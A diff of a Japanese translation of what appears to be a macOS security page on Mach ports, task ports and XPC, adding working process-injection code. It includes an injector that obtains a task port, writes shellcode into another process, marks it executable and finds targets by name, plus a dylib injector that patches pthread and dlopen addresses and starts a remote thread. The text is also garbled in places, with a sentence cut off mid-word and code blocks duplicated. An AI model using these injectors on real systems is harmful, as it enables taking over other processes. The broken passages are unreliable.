@@ -14,46 +14,63 @@
 
 ## ポートを介したMachメッセージング
 
-Machは、リソースの共有において**タスク**を最小単位として使用し、各タスクは**複数のスレッド**を含むことができます。これらの**タスクとスレッドは、POSIXプロセスとスレッドに1：1でマッピング**されます。
+Machは、リソースの共有において**タスク**を最小単位として使用し、各タスクは**複数のスレッド**を含むことができます。これらの**タスクとスレッドは、1:1でPOSIXプロセスとスレッドにマッピング**されます。
 
-タスク間の通信は、Machインタープロセス通信（IPC）を使用して行われ、片方向の通信チャネルを利用します。**メッセージはポート間で転送**され、カーネルによって管理される**メッセージキューのような役割**を果たします。
+タスク間の通信は、Machインタープロセス通信（IPC）を使用して行われ、片方向の通信チャネルを利用します。**メッセージはポート間で転送**され、カーネルによって管理される**メッセージキュー**のような役割を果たします。
 
-タスクが実行できる操作を定義するポート権限は、この通信に重要です。可能な**ポート権限**は次のとおりです。
+タスクが実行できる操作を定義するポート権限は、この通信に重要です。可能な**ポート権限**は次のとおりです：
 
 * **受信権限**：ポートに送信されたメッセージを受信することを許可します。MachポートはMPSC（複数プロデューサ、単一コンシューマ）キューであるため、システム全体で**ポートごとに受信権限は1つだけ**存在できます（複数のプロセスが1つのパイプの読み取りエンドに対するファイルディスクリプタを保持できるパイプとは異なります）。
-* **受信権限を持つタスク**はメッセージを受信し、メッセージを送信するための**送信権限を作成**することができます。元々は**自分自身のタスクがポートに対して受信権限を持っていました**。
+* **受信権限を持つタスク**は、メッセージを受信し、メッセージを送信するための**送信権限を作成**することができます。元々は**自分自身のタスクがポートに対して受信権限を持っていました**。
 * **送信権限**：ポートにメッセージを送信することを許可します。
+* 送信権限は**クローン**することができ、送信権限を所有するタスクは権限を**第三のタスクに付与**することができます。
 * **一度だけ送信権限**：ポートに1つのメッセージを送信し、その後消えます。
-* **ポートセット権限**：単一のポートではなく、_ポートセット_を示します。ポートセットからメッセージをデキューすると、そのポートに含まれるポートの1つからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように、複数のポートで同時にリッスンするために使用できます。
-* **デッドネーム**：実際のポート権限ではなく、単なるプレースホルダーです。ポートが破棄されると、ポートへのすべての既存のポート権限はデッドネームに変わります。
+* **ポートセット権限**：単一のポートではなく、_ポートセット_を示します。ポートセットからメッセージをデキューすると、それに含まれるポートからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように、複数のポートで同時にリッスンするために使用できます。
+* **デッドネーム**：実際のポート権限ではなく、単なるプレースホルダーです。ポートが破棄されると、ポートへのすべての既存のポート権限がデッドネームに変わります。
 
-**タスクはSEND権限を他のタスクに転送**することができ、それによりメッセージを送り返すことができます。**SEND権限は複製することもできるため、タスクはSEND権限を第三のタスクに複製して与える**ことができます。これにより、中間プロセスである**ブートストラップサーバー**との効果的な通信が可能になります。
+**タスクはSEND権限を他のタスクに転送**することができ、それによりメッセージを送信することができるようになります。**SEND権限はクローン**することもできるため、タスクはSEND権限を複製して**第三のタスクに付与**することができます。これにより、中間プロセスである**ブートストラップサーバー**との効果的な通信が可能になります。
 
 #### 手順：
 
 上記に述べられているように、通信チャネルを確立するためには、**ブートストラップサーバー**（macでは**launchd**）が関与します。
 
 1. タスク**A**は**新しいポート**を初期化し、プロセス内で**受信権限**を取得します。
-2. 受信権限を持つタスク**A**は、ポートのために**SEND権限を生成**します。
+2. 受信権限を保持しているタスク**A**は、ポートのために**SEND権限を生成**します。
 3. タスク**A**は、**ブートストラップサーバー**との**接続**を確立し、**ポートのサービス名**と**SEND権限**をブートストラップ登録という手順を通じて提供します。
 4. タスク**B**は、サービス名のために**ブートストラップサーバー**とやり取りし、ブートストラップの**サービス名の検索**を実行します。成功した場合、**サーバーはタスクAから受け取ったSEND権限を複製**し、**タスクBに送信**します。
 5. SEND権限を取得したタスク**B**は、メッセージを**作成**し、それを**タスクAに送信**することができます。
 
-ブートストラップサーバーは、タスクが主張するサービス名を**認証することはできません**。これは、タスクが潜在的に**システムタスクをなりすます**ことができる可能性があることを意味します。たとえば、**認証サービス名を偽って主張**し、その後のすべてのリクエストを承認することができます。
+ブートストラップサーバーは、タスクが主張するサービス名を認証することはできません。これは、タスクが潜在的に**システムタスクをなりすます**ことができる可能性があることを意味します。たとえば、認証サービス名を偽って**承認リクエストをすべて承認**することができます。
 
-その後、Appleは、システムが提供するサービスの名前を、**SIPで保護された**ディレクトリにあるセキュアな設定ファイルに保存しています：`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`。ブートストラップサーバーは、これらのサービス名ごとに**受信権限を作成**し、保持します。
+その後、Appleはシステム提供のサービスの名前を、**SIPで保護された**ディレクトリにあるセキュアな設定ファイルに保存します：`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`。ブートストラップサーバーは、これらのサービス名ごとに**受信権限を作成**し、保持します。
 
-これらの事前定義されたサービスに対しては、**検索プロセスが若干異なります**。サービス名が検索されている場合、launchdはサービスを動的に起動します。新しいワークフローは次のようになります。
+これらの事前定義されたサービスに対しては、**検索プロセスが若干異なります**。サービス名が検索されると、launchdはサービスを動的に起動します。新しいワークフローは次のようになります：
 
-* タスク**B**は、サービス名のためにブートストラップの**検索**を開始します。
+* タスク**B**は、サービス名のためにブートストラップ**検索**を開始します。
 * **launchd**は、タスクが実行中かどうかをチェックし、実行されていない場合は**起動**します。
-* タスク**A**（サービス）は、**ブートストラップチェックイン**を実行します。ここでは、**ブートストラップ**サーバーがSEND権限を作成し、保持し、**受信権限をタスクAに転送**します。
-* launchdは**SEND権限を複製し、タスクBに送信**します。
+* タスク**A**（サービス）は、**ブートストラップチェックイン**を実行します。ここで、**ブートストラップ**サーバーはSEND
+### Mach サービス
 
-ただし、このプロセスは事前定義されたシス
+前述の SIP で保護されたディレクトリにあるアプリケーションで指定された名前は、他のプロセスによって登録されることはありません。
+
+たとえば、`/System/Library/LaunchAgents/com.apple.xpc.loginitemregisterd.plist` は名前 `com.apple.xpc.loginitemregisterd` を登録します。
+```json
+plutil -p com.apple.xpc.loginitemregisterd.plist
+{
+"EnablePressuredExit" => 1
+"Label" => "com.apple.xpc.loginitemregisterd"
+"MachServices" => {
+"com.apple.xpc.loginitemregisterd" => 1
+}
+"ProcessType" => "Adaptive"
+"Program" => "/usr/libexec/loginitemregisterd"
+}
+```
+もし以下のようなコードで登録しようとすると、登録できません。
+
 ### コード例
 
-**送信者**がポートを**割り当て**し、名前`org.darlinghq.example`の**送信権**を作成して**ブートストラップサーバー**に送信する方法に注目してください。送信者はその名前の**送信権**を要求し、それを使用して**メッセージを送信**します。
+**sender** がポートを割り当て、名前 `org.darlinghq.example` のために **send right** を作成し、それを **ブートストラップサーバー** に送信することに注意してください。一方、sender はその名前の **send right** を要求し、それを使用してメッセージを送信しました。
 
 {% tabs %}
 {% tab title="receiver.c" %}
@@ -222,20 +239,20 @@ printf("Sent a message\n");
 
 ### 特権ポート
 
-* **ホストポート**: このポートに対して**Send**権限を持つプロセスは、**システムに関する情報**（例：`host_processor_info`）を取得することができます。
-* **ホスト特権ポート**: このポートに対して**Send**権限を持つプロセスは、カーネル拡張をロードするなどの**特権アクション**を実行することができます。この権限を取得するには、**プロセスはrootである必要があります**。
-* さらに、**`kext_request`** APIを呼び出すためには、Appleのバイナリにのみ与えられる**`com.apple.private.kext`**というエンタイトルメントが必要です。
-* **タスク名ポート**: _タスクポート_の非特権バージョンです。タスクを参照することはできますが、制御することはできません。これを通じて利用可能なのは`task_info()`だけのようです。
-* **タスクポート**（またはカーネルポート）**:** このポートに対してSend権限を持つと、タスクを制御することができます（メモリの読み書き、スレッドの作成など）。
-* 呼び出し元タスクのこのポートの**名前を取得**するには、`mach_task_self()`を呼び出します。このポートは**`exec()`を跨いでのみ継承**されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別なケースとして、suidバイナリの`exec()`後にもタスクは新しいタスクポートを取得します）。タスクを生成し、そのポートを取得する唯一の方法は、`fork()`を行う際に["ポートスワップダンス"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)を実行することです。
+* **ホストポート**: プロセスがこのポートに対して**送信権限**を持っている場合、システムに関する**情報**（例：`host_processor_info`）を取得できます。
+* **ホスト特権ポート**: このポートに対して**送信権限**を持つプロセスは、カーネル拡張をロードするなどの**特権アクション**を実行できます。この権限を取得するには、**プロセスはルート権限**を持つ必要があります。
+* さらに、**`kext_request`** APIを呼び出すためには、Appleのバイナリにのみ与えられる**`com.apple.private.kext*`**という他の権限が必要です。
+* **タスク名ポート**: _タスクポート_の非特権バージョンです。タスクを参照することはできますが、制御することはできません。これを通じて利用できる唯一のものは`task_info()`です。
+* **タスクポート**（またはカーネルポート）**:** このポートに対して送信権限を持つと、タスクを制御することができます（メモリの読み書き、スレッドの作成など）。
+* 呼び出し元タスクのこのポートの**名前を取得**するには、`mach_task_self()`を呼び出します。このポートは**`exec()`を跨いでのみ継承**されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別な場合として、suidバイナリの`exec()`後にもタスクは新しいタスクポートを取得します）。タスクを生成し、そのポートを取得する唯一の方法は、`fork()`を行う際に["ポートスワップダンス"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)を実行することです。
 * これらはポートへのアクセス制限です（バイナリ`AppleMobileFileIntegrity`の`macos_task_policy`から）：
-* アプリに**`com.apple.security.get-task-allow`エンタイトルメント**がある場合、**同じユーザーのプロセスはタスクポートにアクセス**できます（デバッグのためにXcodeによって一般的に追加されます）。**ノータリゼーション**プロセスでは、本番リリースでは許可されません。
-* **`com.apple.system-task-ports`**エンタイトルメントを持つアプリは、カーネルを除く**任意の**プロセスの**タスクポートにアクセス**できます。以前のバージョンでは**`task_for_pid-allow`**と呼ばれていました。これはAppleのアプリケーションにのみ付与されます。
+* アプリに**`com.apple.security.get-task-allow`権限**がある場合、**同じユーザーのプロセスはタスクポートにアクセス**できます（デバッグのためにXcodeによって一般的に追加されます）。**公開リリース**では、**公証**プロセスはこれを許可しません。
+* **`com.apple.system-task-ports`権限**を持つアプリは、カーネルを除く**任意の**プロセスのタスクポートを取得できます。以前のバージョンでは**`task_for_pid-allow`**と呼ばれていました。これはAppleのアプリケーションにのみ付与されます。
 * **ルートユーザーは、ハード化されたランタイムでコンパイルされていないアプリケーション**（およびAppleのアプリケーションではないもの）のタスクポートにアクセスできます。
 
-### タスクポートを介したシェルコードのプロセスインジェクション
+### タスクポートを介したスレッドへのシェルコードのインジェクション
 
-シェルコードを取得するには、次のリンクから参照してください：
+シェルコードを取得するには、次の場所から取得できます：
 
 {% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
 [arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
@@ -246,12 +263,28 @@ printf("Sent a message\n");
 ```objectivec
 // clang -framework Foundation mysleep.m -o mysleep
 // codesign --entitlements entitlements.plist -s - mysleep
+
 #import <Foundation/Foundation.h>
+
+double performMathOperations() {
+double result = 0;
+for (int i = 0; i < 10000; i++) {
+result += sqrt(i) * tan(i) - cos(i);
+}
+return result;
+}
 
 int main(int argc, const char * argv[]) {
 @autoreleasepool {
-NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
-[NSThread sleepForTimeInterval:99999];
+NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
+processIdentifier]);
+while (true) {
+[NSThread sleepForTimeInterval:5];
+
+performMathOperations();  // Silent action
+
+[NSThread sleepForTimeInterval:5];
+}
 }
 return 0;
 }
@@ -272,40 +305,48 @@ return 0;
 #import <Foundation/Foundation.h>
 #import <mach/mach.h>
 #import <mach/mach_vm.h>
+#import <sys/mman.h>
 
 int main(int argc, const char * argv[]) {
     @autoreleasepool {
-        if (argc != 2) {
+        if (argc < 2) {
             printf("Usage: %s <pid>\n", argv[0]);
-            return 1;
+            return 0;
         }
         
         pid_t target_pid = atoi(argv[1]);
         mach_port_t target_task;
         kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &target_task);
         if (kr != KERN_SUCCESS) {
-            printf("Failed to get task for pid %d: %s\n", target_pid, mach_error_string(kr));
-            return 1;
+            printf("Failed to get task for pid: %d\n", target_pid);
+            return 0;
         }
         
-        const char *payload = "Hello, World!";
+        const char *shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+        size_t shellcode_size = strlen(shellcode);
+        
         mach_vm_address_t remote_address;
-        kr = mach_vm_allocate(target_task, &remote_address, strlen(payload), VM_FLAGS_ANYWHERE);
+        kr = mach_vm_allocate(target_task, &remote_address, shellcode_size, VM_FLAGS_ANYWHERE);
         if (kr != KERN_SUCCESS) {
-            printf("Failed to allocate memory in target task: %s\n", mach_error_string(kr));
-            return 1;
+            printf("Failed to allocate memory in target process\n");
+            return 0;
         }
         
-        kr = mach_vm_write(target_task, remote_address, (vm_offset_t)payload, strlen(payload));
+        kr = mach_vm_write(target_task, remote_address, (vm_offset_t)shellcode, shellcode_size);
         if (kr != KERN_SUCCESS) {
-            printf("Failed to write payload to target task: %s\n", mach_error_string(kr));
-            return 1;
+            printf("Failed to write shellcode to target process\n");
+            return 0;
         }
         
-        printf("Payload injected at address: 0x%llx\n", remote_address);
+        kr = mach_vm_protect(target_task, remote_address, shellcode_size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+        if (kr != KERN_SUCCESS) {
+            printf("Failed to change memory protection of shellcode in target process\n");
+            return 0;
+        }
         
-        return 0;
+        printf("Shellcode injected successfully\n");
     }
+    return 0;
 }
 ```
 {% endtab %}
@@ -316,7 +357,7 @@ Compile the previous program and add the entitlements to be able to inject code 
 
 <details>
 
-<summary>injector.m</summary>
+<summary>sc_injector.m</summary>
 ```objectivec
 // gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
 
@@ -459,14 +500,54 @@ return (-3);
 return (0);
 }
 
+pid_t pidForProcessName(NSString *processName) {
+NSArray *arguments = @[@"pgrep", processName];
+NSTask *task = [[NSTask alloc] init];
+[task setLaunchPath:@"/usr/bin/env"];
+[task setArguments:arguments];
+
+NSPipe *pipe = [NSPipe pipe];
+[task setStandardOutput:pipe];
+
+NSFileHandle *file = [pipe fileHandleForReading];
+
+[task launch];
+
+NSData *data = [file readDataToEndOfFile];
+NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+
+return (pid_t)[string integerValue];
+}
+
+BOOL isStringNumeric(NSString *str) {
+NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
+NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
+return r.location == NSNotFound;
+}
+
 int main(int argc, const char * argv[]) {
 @autoreleasepool {
 if (argc < 2) {
-NSLog(@"Usage: %s <pid>", argv[0]);
+NSLog(@"Usage: %s <pid or process name>", argv[0]);
 return 1;
 }
 
-pid_t pid = atoi(argv[1]);
+NSString *arg = [NSString stringWithUTF8String:argv[1]];
+pid_t pid;
+
+if (isStringNumeric(arg)) {
+pid = [arg intValue];
+} else {
+pid = pidForProcessName(arg);
+if (pid == 0) {
+NSLog(@"Error: Process named '%@' not found.", arg);
+return 1;
+}
+else{
+printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
+}
+}
+
 inject(pid);
 }
 
@@ -476,17 +557,17 @@ return 0;
 </details>
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
-./inject <pid-of-mysleep>
+./inject <pi or string>
 ```
-### タスクポートを介したDylibプロセスインジェクション
+### タスクポートを介したスレッドへのDylibインジェクション
 
-macOSでは、**Mach**または**posix `pthread` API**を使用して**スレッド**を操作することができます。前のインジェクションで生成したスレッドは、Mach APIを使用して生成されたため、**posix準拠ではありません**。
+macOSでは、**スレッド**は**Mach**を使用するか、**posixの`pthread` API**を使用して操作することができます。前のインジェクションで生成したスレッドは、Mach APIを使用して生成されたため、**posixに準拠していません**。
 
-単純なシェルコードをインジェクションしてコマンドを実行することができたのは、**posix準拠のAPIではなく、Machのみで動作する必要があった**ためです。**より複雑なインジェクション**では、スレッドも**posix準拠**である必要があります。
+単純なシェルコードをインジェクションしてコマンドを実行することができたのは、**posixに準拠する必要がなく**、Machのみで動作する必要があったためです。**より複雑なインジェクション**では、スレッドも**posixに準拠する必要があります**。
 
-したがって、シェルコードを**改善するためには、`pthread_create_from_mach_thread`を呼び出す**必要があります。これにより、新しいpthreadが**有効なpthreadを作成**できます。その後、この新しいpthreadは、システムから**dylibをロード**するために**dlopen**を呼び出すことができます。
+したがって、スレッドを**改善するためには**、**`pthread_create_from_mach_thread`**を呼び出す必要があります。これにより、有効なpthreadが作成されます。その後、この新しいpthreadは、システムから**dylibをロードするためにdlopenを呼び出す**ことができます。つまり、異なるアクションを実行するための新しいシェルコードを書く代わりに、カスタムライブラリをロードすることができます。
 
-（例えば、ログを生成してそれを聞くことができるものなど）**例のdylib**は以下で見つけることができます：
+例えば、（ログを生成し、それを聞くことができるものなど）**例のdylib**は以下で見つけることができます：
 
 {% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
 [macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
@@ -546,7 +627,7 @@ mach_msg_type_number_t dataCnt
 
 char injectedCode[] =
 
-"\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
+// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)
 
 // Call pthread_set_self
 
@@ -661,21 +742,127 @@ memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
 printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
 }
 ```c
-if (memcmp(possiblePatchLocation, "PTHRDCRT", 8) == 0)
+if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
 {
-    memcpy(possiblePatchLocation, &addrOfPthreadCreate, 8);
-    printf("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
+memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
+printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
 }
 
 if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
 {
-    printf("DLOpen @%llx\n", addrOfDlopen);
-    memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
+printf ("DLOpen @%llx\n", addrOfDlopen);
+memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
 }
 
 if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
 {
-    strcpy(possiblePatchLocation, lib);
+strcpy(possiblePatchLocation, lib );
+}
+}
+
+// Write the shellcode to the allocated memory
+kr = mach_vm_write(remoteTask,                   // Task port
+remoteCode64,                 // Virtual Address (Destination)
+(vm_address_t) injectedCode,  // Source
+0xa9);                       // Length of the source
+
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
+return (-3);
+}
+
+
+// Set the permissions on the allocated code memory
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
+return (-4);
+}
+
+// Set the permissions on the allocated stack memory
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
+
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
+return (-4);
+}
+
+
+// Create thread to run shellcode
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;
+
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
+
+remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16
+
+const char* p = (const char*) remoteCode64;
+
+remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+
+printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+
+kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+
+if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+return (-3);
+}
+
+return (0);
+}
+
+
+
+int main(int argc, const char * argv[])
+{
+if (argc < 3)
+{
+fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
+fprintf (stderr, "   _action_: path to a dylib on disk\n");
+exit(0);
+}
+
+pid_t pid = atoi(argv[1]);
+const char *action = argv[2];
+struct stat buf;
+
+int rc = stat (action, &buf);
+if (rc == 0) inject(pid,action);
+else
+{
+fprintf(stderr,"Dylib not found\n");
+}
+
+}
+```
+
+```c
+if (memcmp(possiblePatchLocation, "PTHRDCRT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &addrOfPthreadCreate, 8);
+printf("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
+}
+
+if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
+{
+printf("DLOpen @%llx\n", addrOfDlopen);
+memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
+}
+
+if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
+{
+strcpy(possiblePatchLocation, lib);
 }
 }
 
@@ -698,7 +885,7 @@ kr = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EX
 
 if (kr != KERN_SUCCESS)
 {
-fprintf(stderr, "リモートスレッドのコードのメモリアクセス権を設定できませんでした：エラー %s\n", mach_error_string(kr));
+fprintf(stderr, "リモートスレッドのコードのメモリアクセス権を設定できません：エラー %s\n", mach_error_string(kr));
 return (-4);
 }
 
@@ -707,34 +894,33 @@ kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_P
 
 if (kr != KERN_SUCCESS)
 {
-fprintf(stderr, "リモートスレッドのスタックのメモリアクセス権を設定できませんでした：エラー %s\n", mach_error_string(kr));
+fprintf(stderr, "リモートスレッドのスタックのメモリアクセス権を設定できません：エラー %s\n", mach_error_string(kr));
 return (-4);
 }
 
 
-// シェルコードを実行するためのスレッドを作成する
+// シェルコードを実行するスレッドを作成する
 struct arm_unified_thread_state remoteThreadState64;
-thread_act_t remoteThread;
+thread_act_t         remoteThread;
 
 memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
 
 remoteStack64 += (STACK_SIZE / 2); // これが実際のスタックです
 //remoteStack64 -= 8;  // 16のアライメントが必要です
 
-const char *p = (const char *)remoteCode64;
+const char* p = (const char*) remoteCode64;
 
 remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
 remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
-remoteThreadState64.ts_64.__pc = (u_int64_t)remoteCode64;
-remoteThreadState64.ts_64.__sp = (u_int64_t)remoteStack64;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
 
 printf("リモートスタック64  0x%llx、リモートコードは %p\n", remoteStack64, p);
 
 kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
-(thread_state_t)&remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);
 
-if (kr != KERN_SUCCESS)
-{
+if (kr != KERN_SUCCESS) {
 fprintf(stderr, "リモートスレッドの作成に失敗しました：エラー %s", mach_error_string(kr));
 return (-3);
 }
@@ -744,7 +930,7 @@ return (0);
 
 
 
-int main(int argc, const char *argv[])
+int main(int argc, const char * argv[])
 {
 if (argc < 3)
 {
@@ -758,11 +944,10 @@ const char *action = argv[2];
 struct stat buf;
 
 int rc = stat(action, &buf);
-if (rc == 0)
-    inject(pid, action);
+if (rc == 0) inject(pid, action);
 else
 {
-    fprintf(stderr, "Dylibが見つかりません\n");
+fprintf(stderr, "Dylibが見つかりません\n");
 }
 
 }
@@ -772,7 +957,9 @@ else
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
 ```
-### タスクポートを介したスレッドインジェクション <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+### タスクポートを介したスレッドハイジャッキング <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+
+このテクニックでは、プロセスのスレッドがハイジャックされます：
 
 {% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
 [macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
@@ -782,25 +969,25 @@ gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 
 ### 基本情報
 
-XPC（XNUはmacOSで使用されるカーネル）インタープロセス通信は、macOSとiOS上のプロセス間の通信のためのフレームワークです。XPCは、システム上の異なるプロセス間で安全な非同期メソッド呼び出しを行うためのメカニズムを提供します。これはAppleのセキュリティパラダイムの一部であり、特権を分離したアプリケーションの作成を可能にし、各コンポーネントが必要な権限のみで動作するため、侵害されたプロセスからの潜在的な被害を制限します。
+XPC（XNUとは、macOSで使用されるカーネル）インタープロセス通信は、macOSとiOS上のプロセス間の通信のためのフレームワークです。XPCは、システム上の異なるプロセス間で安全な非同期メソッド呼び出しを行うためのメカニズムを提供します。これはAppleのセキュリティパラダイムの一部であり、特権を分離したアプリケーションの作成を可能にし、各コンポーネントが必要な権限のみで動作するため、侵害されたプロセスからの潜在的な被害を制限します。
 
-XPCは、同じシステム上で実行される異なるプログラム間でデータを送受信するための一連のメソッドである、インタープロセス通信（IPC）の形式を使用します。
+XPCは、同じシステム上で実行される異なるプログラム間でデータを送受信するための一連の方法である、インタープロセス通信（IPC）の形式を使用します。
 
 XPCの主な利点は次のとおりです：
 
 1. **セキュリティ**：作業を異なるプロセスに分割することで、各プロセスに必要な権限のみを付与することができます。これにより、プロセスが侵害された場合でも、被害を最小限に抑えることができます。
-2. **安定性**：XPCはクラッシュを発生したコンポーネントに限定することで、システム全体に影響を与えずにプロセスを再起動するのに役立ちます。
-3. **パフォーマンス**：XPCは簡単な並行性を可能にし、異なるプロセスで同時にさまざまなタスクを実行できます。
+2. **安定性**：XPCは、クラッシュを発生させたコンポーネントに隔離するのに役立ちます。プロセスがクラッシュした場合、システムの他の部分に影響を与えることなく再起動することができます。
+3. **パフォーマンス**：XPCは簡単な並行性を可能にし、異なるプロセスで同時にさまざまなタスクを実行することができます。
 
-唯一の**欠点**は、アプリケーションを複数のプロセスに分割してXPCを介して通信させることは**効率が低下する**ということです。しかし、現在のシステムではほとんど気づかれず、利点の方がはるかに優れています。
+唯一の**欠点**は、アプリケーションを複数のプロセスに分割してXPCを介して通信させることは、**効率が低下する**ということです。しかし、現在のシステムではほとんど気づかれず、利点の方がはるかに優れています。
 
-例として、QuickTime Playerでは、XPCを使用してビデオのデコードを担当するコンポーネントがあります。このコンポーネントは計算タスクを実行するために特別に設計されており、侵害された場合でも、ファイルやネットワークへのアクセスなど、攻撃者に有益な利得を提供しません。
+QuickTime Playerの例では、XPCを使用してビデオのデコードを担当するコンポーネントがあります。このコンポーネントは計算タスクを実行するために特別に設計されており、侵害された場合でも、ファイルやネットワークへのアクセスなど、攻撃者に有益な利得を提供しません。
 
 ### アプリケーション固有のXPCサービス
 
-アプリケーションのXPCコンポーネントは、**アプリケーション自体の中にあります**。たとえば、Safariでは、**`/Applications/Safari.app/Contents/XPCServices`**にそれらを見つけることができます。拡張子は**`.xpc`**（例：**`com.apple.Safari.SandboxBroker.xpc`**）であり、**メインバイナリ**も**バンドル**されています：`/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`
+アプリケーションのXPCコンポーネントは、**アプリケーション自体の中にあります**。たとえば、Safariでは、**`/Applications/Safari.app/Contents/XPCServices`**にそれらを見つけることができます。拡張子は**`.xpc`**（例：**`com.apple.Safari.SandboxBroker.xpc`**）であり、**メインバイナリ**もそれに含まれています：`/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`
 
-XPCコンポーネントは、他のXPCコンポーネントやメインのアプリバイナリとは異なる**エンタイトルメントと特権**を持つ場合があります。ただし、XPCサービスが**Info.plist**ファイルで[**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession)を「True」に設定されている場合は除きます。この場合、XPCサービスは呼び出したアプリケーションと同じセキュリティセッションで実行されます。
+XPCコンポーネントは、他のXPCコンポーネントやメインのアプリバイナリとは異なる**エンタイトルメントと特権**を持つ場合があります。ただし、XPCサービスが**Info.plist**ファイルで[**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession)を「True」に設定されている場合は除きます。この場合、XPCサービスは、それを呼び出したアプリケーションと同じセキュリティセッションで実行されます。
 
